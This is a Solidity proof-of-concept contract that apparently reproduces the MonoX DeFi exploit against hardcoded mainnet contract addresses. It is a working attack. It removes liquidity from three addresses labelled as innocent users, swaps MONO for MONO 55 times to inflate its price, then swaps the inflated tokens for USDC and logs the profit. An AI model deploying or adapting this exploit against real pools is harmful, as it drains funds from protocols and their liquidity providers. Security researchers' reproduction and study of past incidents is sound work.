pragma solidity >=0.7.0 <0.9.0;

import "hardhat/console.sol";
import "./IMonoswap.sol";
import "./MonoXPool.sol";
import "./Weth.sol";
import "./MonoToken.sol";
import "./USDC.sol";

contract POC{
    address WETH9_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address Mono_Token_Address = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;
    address MonoXPool_Address = 0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4;
    address Monoswap_address =  0xC36a7887786389405EA8DA0B87602Ae3902B88A1;
    address Innocent_user_1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;
    address Innocent_user_2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;
    address Innocent_user_3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;
    address USDC_Address =  0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    uint256 Amount_Of_MonoToken_On_XPool;
    uint256 public Amount_Of_USDC_On_XPool;
    uint256 public Amoount_Of_Mono_On_This; 


    function start()  public payable{
        MonoToken(Mono_Token_Address).approve(Monoswap_address,type(uint256).max);
        WETH9(WETH9_Address).deposit{value:address(this).balance,gas:40000}();
        WETH9(WETH9_Address).approve(Monoswap_address,0.1 ether);
        Monoswap(Monoswap_address).swapExactTokenForToken(WETH9_Address,Mono_Token_Address,0.1 ether,1,address(this),block.timestamp);
        RemoveLiquidity_From_3_Users();
        Monoswap(Monoswap_address).addLiquidity(Mono_Token_Address,196875656,address(this));
        Swap_Mono_for_Mono_55_Times();
        Swap_Mono_For_USDC();
        uint att_balance = USDC(USDC_Address).balanceOf(msg.sender);
        console.log("Profit USDC amonut:",att_balance);
    }



    function RemoveLiquidity_From_3_Users() internal{
        uint256 balance_Of_User1 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_1,10);
        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User1,Innocent_user_1,0,1);
        uint256 balance_Of_User2 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_2,10);
        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User2,Innocent_user_2,0,1);
        uint256 balance_Of_User3 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_3,10);
        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User3,Innocent_user_3,0,1);
    }

    function Swap_Mono_for_Mono_55_Times() internal{
        for(uint256 i=0;i < 55; i++){
            (,,,,,,Amount_Of_MonoToken_On_XPool,,) = Monoswap(Monoswap_address).pools(Mono_Token_Address);
            Monoswap(Monoswap_address).swapExactTokenForToken(Mono_Token_Address,Mono_Token_Address,Amount_Of_MonoToken_On_XPool-1,0,address(this),block.timestamp);          
        }
    }

    function Swap_Mono_For_USDC() internal{
        (,,,,,,Amount_Of_USDC_On_XPool,,) = Monoswap(Monoswap_address).pools(USDC_Address);
        Amoount_Of_Mono_On_This = MonoToken(Mono_Token_Address).balanceOf(address(this));
        Monoswap(Monoswap_address).swapTokenForExactToken(Mono_Token_Address,USDC_Address,Amoount_Of_Mono_On_This,3800000000000,msg.sender,block.timestamp);
    }

    receive() payable external{}
    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4){
        bytes4 a = 0xf23a6e61;
        return a;
    }
}